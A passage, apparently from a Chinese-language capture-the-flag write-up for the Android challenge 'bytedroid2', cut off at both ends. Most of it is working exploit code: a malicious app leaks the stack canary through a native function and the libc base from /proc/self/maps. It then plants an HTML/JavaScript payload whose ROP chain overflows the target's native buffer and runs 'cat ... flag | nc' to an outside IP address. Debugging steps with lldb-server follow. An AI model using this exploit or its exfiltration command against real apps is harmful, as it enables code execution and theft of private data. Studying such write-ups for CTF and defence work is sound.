payload += <span class="title function_">p32</span>(system + libc_base).<span class="title function_">repeat</span>(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x000aa692 : pop ecx ; ret</span></span><br><span class="line">    <span class="comment">// 0x000596f5 : add eax, ecx ; ret</span></span><br><span class="line">    <span class="comment">// 0x0004415b : push eax ; call esi</span></span><br><span class="line"></span><br><span class="line">    payload += <span class="title function_">p32</span>(libc_base + <span class="number">0x000aa692</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(<span class="number">0xb4</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(libc_base + <span class="number">0x000596f5</span>)</span><br><span class="line">    payload += <span class="title function_">p32</span>(libc_base + <span class="number">0x0004415b</span>)</span><br><span class="line"></span><br><span class="line">    payload += <span class="title function_">str2hex</span>(<span class="string">&#x27;cat /data/data/com.bytectf.bytedroid2/files/flag | nc &#123;ip&#125;&#x27;</span>)</span><br><span class="line">    payload += <span class="string">&#x27;00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">BridgeUtils</span>.<span class="title function_">func</span>(payload)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="APP构建"><a href="#APP构建" class="headerlink" title="APP构建"></a>APP构建</h2><h3 id="AndroidManifest-xml-1"><a href="#AndroidManifest-xml-1" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Pwnbytedroid2&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Utils-cpp"><a href="#Utils-cpp" class="headerlink" title="Utils.cpp"></a>Utils.cpp</h3><p>Java_com_bytectf_pwnbytedroid2_MainActivity_getCanary来泄露canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TAG <span class="string">&quot;evil&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGD类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGI类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGW(...) __android_log_print(ANDROID_LOG_WARN,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGW类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGE类型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGF(...) __android_log_print(ANDROID_LOG_FATAL,TAG ,__VA_ARGS__) <span class="comment">// 定义LOGF类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_bytectf_pwnbytedroid2_MainActivity_getCanary</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    jbyte buf[<span class="number">0x80</span>];</span><br><span class="line">    LOGE(<span class="string">&quot;%p&quot;</span>,*(<span class="type">size_t</span> *)(buf+<span class="number">0x80</span>));</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *)(buf+<span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>意思是在 C&#x2F;C++ 里写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOGE(&quot;canary=%p&quot;, value);</span><br></pre></td></tr></table></figure><p>就等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__android_log_print(ANDROID_LOG_ERROR, &quot;evil&quot;, &quot;canary=%p&quot;, value);</span><br></pre></td></tr></table></figure><p>LOGD：Debug（调试）</p><p>LOGI：Info（信息）</p><p>LOGW：Warn（警告）</p><p>LOGE：Error（错误）</p><p>LOGF：Fatal（致命）</p></blockquote><h3 id="MainActivity-1"><a href="#MainActivity-1" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>build.gradle里需要加implementation ‘commons-io:commons-io:2.6’</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbytedroid2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.Manifest;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.RequiresApi;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;101.43.26.67&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequiresApi(api = Build.VERSION_CODES.M)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (PackageManager.PERMISSION_GRANTED != checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)) &#123;</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.loadLibrary(<span class="string">&quot;Utils&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">canary</span> <span class="operator">=</span> Integer.toHexString(getCanary());</span><br><span class="line">        <span class="type">String</span> <span class="variable">libcBase</span> <span class="operator">=</span> getLibcBase();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/sdcard/Documents/Bytedroid2&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">            IOUtils.write(getPayload(libcBase, canary),fileOutputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getPackageManager().getLaunchIntentForPackage(<span class="string">&quot;com.bytectf.bytedroid2&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;crash&quot;</span>, <span class="keyword">new</span> <span class="title class_">CrashParcelable</span>());</span><br><span class="line">        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">        sleep(<span class="number">3000</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;crash&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">getCanary</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getLibcBase</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">libcBase</span> <span class="operator">=</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">i</span> <span class="operator">=</span> IOUtils.toString(fileInputStream);</span><br><span class="line">            <span class="keyword">for</span> (String line: i.split(<span class="string">&quot;\n&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(line.contains(<span class="string">&quot;libc.so&quot;</span>))&#123;</span><br><span class="line">                    libcBase = line.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> libcBase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getPayload</span><span class="params">(String libcBase, String canary)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;button style=\&quot;width:200px;height:200px;font-size: 30px;\&quot; onclick=\&quot;poc()\&quot;&gt;poc&lt;/button&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;button style=\&quot;width:200px;height:200px;font-size: 30px;\&quot; onclick=\&quot;location.href=location.href\&quot;&gt;F5&lt;/button&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;script&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function toLittleEdian(s) &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    return s.slice(6, 8) + s.slice(4, 6) + s.slice(2, 4) + s.slice(0, 2);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function u32(data)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    return parseInt(toLittleEdian(data), 16)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function p32(data)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    return toLittleEdian(data.toString(16).padStart(8,&#x27;0&#x27;))\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function str2hex(str)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  var arr = [];\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  for(var i=0;i&lt;str.length;i++)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    arr.push(str.charCodeAt(i).toString(16));\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  return arr.join(&#x27;&#x27;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;function poc()&#123;\n&quot;</span> +</span><br><span class="line">                String.format(<span class="string">&quot;    libc_base = 0x%s\n&quot;</span>, libcBase) +</span><br><span class="line">                String.format(<span class="string">&quot;    canary = 0x%s\n&quot;</span>, canary) +</span><br><span class="line">                <span class="string">&quot;    system = 0x89d20\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload = &#x27;&#x27;.padEnd(0x80*2, &#x27;0&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(canary)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(system+libc_base).repeat(8)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x000aa692 : pop ecx ; ret\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x0005dbe8 : sub eax, ecx ; ret\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x000596f5 : add eax, ecx ; ret\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;// 0x0004415b : push eax ; call esi\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(libc_base+0x000aa692)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(0xb4)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(libc_base+0x000596f5)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    payload += p32(libc_base+0x0004415b)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                String.format( <span class="string">&quot;    payload += str2hex(&#x27;cat /data/data/com.bytectf.bytedroid2/files/flag | nc %s 37203&#x27;)\n&quot;</span>, ip) +</span><br><span class="line"><span class="comment">//                &quot;    payload += str2hex(&#x27;touch /data/data/com.bytectf.bytedroid2/flag&#x27;)\n&quot; +</span></span><br><span class="line">                <span class="string">&quot;    payload += &#x27;00&#x27;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    BridgeUtils.func(payload)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;poc()\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/script&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">int</span> ms)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(ms);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">android_command</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String temp;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            <span class="keyword">while</span> ((temp = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                buffer.append(temp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> buffer.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getPackageManager().getLaunchIntentForPackage:让系统返回像用户点击桌面图标一样启动该 App的 Intent</p><p>下面的HTML 把 flag 通过 <code>nc</code> 发到攻击者机器</p><p>调用链是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">JS</span><br><span class="line"> → BridgeUtils.func(hex)</span><br><span class="line"> → Java func(String)</span><br><span class="line"> → unhex()</span><br><span class="line"> → native memcpy(buf, ...)</span><br><span class="line"> → 栈溢出</span><br><span class="line"> → ROP</span><br></pre></td></tr></table></figure><p>调试使用lldb，可以用android studio的或者lldb -server调试</p><p>确认架构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure><p>把 lldb-server 推到设备</p><p><code>lldb-server</code> 在 NDK 里，一般路径类似：</p><p><code>.../Android/Sdk/ndk/&lt;ver&gt;/toolchains/llvm/prebuilt/&lt;host&gt;/lib64/clang/&lt;ver&gt;/lib/linux/&lt;arch&gt;/lldb-server</code>（不同版本略有差异）</p><p>推到设备：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb push lldb-server /data/local/tmp/lldb-server</span><br><span class="line">adb shell chmod 755 /data/local/tmp/lldb-server</span><br></pre></td></tr></table></figure><blockquote><p>如果你找不到 lldb-server，最简单是直接用 Android Studio 自带的 NDK&#x2F;LLDB，或用 <code>ndk-which lldb-server</code>（有的环境支持）。</p></blockquote><p>启动目标 App，并拿 PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pidof com.bytectf.bytedroid2</span><br></pre></td></tr></table></figure><p>在设备上启动 lldb-server attach 到 PID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell /data/local/tmp/lldb-server platform --listen &quot;*:12345&quot; --server</span><br></pre></td></tr></table></figure><p>（有的也用 gdbserver 风格命令，但现在更推荐 <code>platform --listen</code> 这种。）</p><p>本机端口转发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:12345 tcp:12345</span><br></pre></td></tr></table></figure><p>本机启动 lldb 连接</p><p>在电脑上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lldb</span><br></pre></td></tr></table></figure><p>进入 lldb 后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">platform select remote-android</span><br><span class="line">platform connect connect://127.0.0.1:12345</span><br></pre></td></tr></table></figure><p>然后 attach（两种方式）：</p><p>按 PID attach：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process attach -p &lt;PID&gt;</span><br></pre></td></tr></table></figure><p>或按进程名（有时不稳定）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process attach -n com.bytectf.bytedroid2</span><br></pre></td></tr></table></figure><p>下断点到 memcpy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">breakpoint set -n memcpy</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><p>当断住后常看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bt</span><br><span class="line">register read</span><br></pre></td></tr></table></figure><p>想看当前栈顶附近：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">register read sp</span><br><span class="line">memory read --format x --size 